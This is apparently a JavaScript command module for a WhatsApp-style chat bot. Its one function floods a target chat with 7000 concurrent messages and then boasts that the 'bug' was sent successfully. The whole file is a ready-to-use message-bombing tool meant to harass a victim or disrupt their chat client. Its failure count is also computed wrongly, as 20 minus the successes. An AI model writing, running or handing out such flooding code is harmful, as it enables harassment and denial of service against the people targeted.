const { channelInfo } = require('../lib/messageConfig');  
  
async function sulexhCommand(sock, chatId, message) {  
    try {  
        const boomMessages = [];  
          
        for (let i = 0; i < 7000; i++) {  
            const boomPromise = sock.sendMessage(chatId, {   
                text: "💥☠️😭😭YOU HAVE BEEN SUCCESSFULLY"   
            }).catch((error) => {  
                console.log(`Message failed:`, error.message || error);  
                return { failed: true };  
            });  
              
            boomMessages.push(boomPromise);  
        }  
  
        console.log("🚀 Launching 7000 concurrent messages...");  
        const launchStartTime = Date.now();  
          
        const boomResults = await Promise.allSettled(boomMessages);  
          
        const launchEndTime = Date.now();  
        const totalLaunchTime = launchEndTime - launchStartTime;  
  
        const successfulHits = boomResults.filter(result =>   
            result.status === 'fulfilled' &&   
            result.value &&   
            !result.value.failed  
        ).length;  
          
        const failedHits = 20 - successfulHits;  
  
        await sock.sendMessage(chatId, {  
            text: `💥 BUG HAS BEEN SUCCESSFULLY SENT 💥\n` +  
                  `📊 Statistics:\n` +  
                  `✅ Successful: ${successfulHits}/7000\n` +  
                  `❌ Failed: ${failedHits}/7000\n` +  
                  `⏱️ Total Time: ${totalLaunchTime}ms\n` +  
                  `🚀 Bug  Command Execution: TRUE`,  
            ...channelInfo  
        }, { quoted: message });  
  
        console.log(`Execution completed: ${successfulHits}/7000 messages sent in ${totalLaunchTime}ms`);  
  
    } catch (error) {  
        console.error("Critical command error:", error);  
  
        await sock.sendMessage(chatId, {  
            text: "❌ SYSTEM FAILURE\n" +  
                  `Error: ${error.message || 'Unknown error occurred'}`,  
            ...channelInfo  
        }, { quoted: message });  
    }  
}  
  
module.exports = sulexhCommand;
